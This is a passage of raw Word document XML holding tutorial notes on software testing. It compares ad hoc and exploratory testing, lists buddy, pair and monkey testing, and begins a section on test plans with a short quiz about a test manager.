        <w:t>Before Ad Hoc Testing, you need to perform considerable software testing. Before Exploratory Testing of the software, you may learn this software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRDefault="0095528B" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:ind w:left="0"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
        <w:t>Exploratory Testing is a type of Ad Hoc Testing. Ad Hoc Testing is an independent testing type.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
      <w:pPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0095528B" w:rsidRPr="002D1079" w:rsidRDefault="0095528B" w:rsidP="002D1079">
      <w:pPr>
        <w:spacing w:before="180" w:after="0" w:line="312" w:lineRule="atLeast"/>
        <w:textAlignment w:val="top"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D1079">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:b/>
          <w:color w:val="5E5E5E"/>
        </w:rPr>
        <w:t>Ad Hoc Testing is not considered to be testing approach. Exploratory Testing is an approach.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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Exploratory Testing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> is a testing approach that allows you to apply your ability and skill as a tester in a powerful way.</w:t>
      </w:r>
      <w:r w:rsidR="00630F0F">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Testers have to understand the application first by exploring the application, finding out about the software. Exploratory testing is a simultaneous process of test design and test execution all done at the same time. The focus of exploratory testing is more on testing as a "thinking" activity. See it </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="18529A"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Pros and Cons</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>. It is a bit formal process than Ad-hoc testing. </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="18529A"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Sometimes it is referred as improved version of Ad-hoc</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C210EB" w:rsidRDefault="00C210EB" w:rsidP="002D1079">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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Ad-hoc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> testing is an informal testing type with an aim to break the system. This testing is usually an unplanned </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>activity .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> It does not follow any test design techniques to create test cases. This testing is primarily performed if the knowledge of testers in the system under test is very high. This testing requires no documentation/ planning /process to be followed. Usually </w:t>
      </w:r>
      <w:hyperlink r:id="rId50" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="18529A"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Ad-Hoc</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> testing is performed after the formal test execution. </w:t>
      </w:r>
      <w:hyperlink r:id="rId51" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="18529A"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>It has following types</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>:-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>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Buddy testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Pair Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRDefault="002D1079" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>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Monkey Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="001D67EA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Ad-hoc testing is itself known as </w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Monkey</w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> or </w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Random</w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRPr="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Exploratory testing</w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
        <w:t> involves the simultaneous learning, test design and test execution.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRPr="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
        <w:t>If you're working out the random inputs while you're in session and then learning something about the system behavior from the outputs, then you're conducting monkey tests inside an exploratory testing session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRPr="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Ad-hoc</w:t>
      </w:r>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
        <w:t> testing refers to whether the test was planned or not.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D67EA" w:rsidRPr="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D67EA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
        </w:rPr>
        <w:t>Both monkey tests and exploratory test sessions can be planned or unplanned, thus either can be ad-hoc</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9356"/>
        <w:gridCol w:w="4"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D1079" w:rsidTr="002D1079">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="0" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="225" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
            <w:pPr>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
                <w:color w:val="242729"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="002D1079" w:rsidRDefault="002D1079" w:rsidP="002D1079">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
                <w:color w:val="242729"/>
                <w:sz w:val="23"/>
                <w:szCs w:val="23"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D67EA" w:rsidTr="002D1079">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="0" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="225" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="001D67EA" w:rsidRPr="001D67EA" w:rsidRDefault="001D67EA" w:rsidP="001D67EA">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
              <w:textAlignment w:val="baseline"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
                <w:color w:val="242729"/>
                <w:sz w:val="23"/>
                <w:szCs w:val="23"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="24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lastRenderedPageBreak/>
              <w:t>What is a Test Plan?</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 test plan is a detailed document that outlines the test strategy,</w:t>
            </w:r>
            <w:hyperlink r:id="rId52" w:history="1">
              <w:r w:rsidRPr="00E97930">
                <w:rPr>
                  <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="40A2B5"/>
                </w:rPr>
                <w:t> Testing </w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve">objectives, resources (manpower, software, </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>hardware</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>) required for testing, test schedule, test estimation and test deliverables.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test plan serves as a blueprint to conduct software testing activities as a defined process which is minutely monitored and controlled by the test manager.</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Let’s start with following scenario</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a meeting, you want to discuss the Test Plan with the team members, but they are not interested - .</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve"> such case, what will you do? Select your answer as following figure</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:shd w:val="clear" w:color="auto" w:fill="ADD8E6"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>A) I am Manager do everything as I said</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="34343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3pt;height:18.35pt" o:ole="">
                  <v:imagedata r:id="rId53" o:title=""/>
                </v:shape>
                <w:control r:id="rId54" w:name="DefaultOcxName" w:shapeid="_x0000_i1028"/>
              </w:object>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> B) OK, let's me explain why we need a Test Plan</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:br/>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>As a Test Manager, you must explain them the importance of Test Plan rather than force the team to do what you want.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading3"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="240" w:line="372" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Importance of Test Plan</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Making Test Plan has multiple benefits</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Test Plan helps us determine the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>effort</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> needed to validate the quality of the application  under test</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9"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Help people outside the test team such as developers, business managers, customers </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
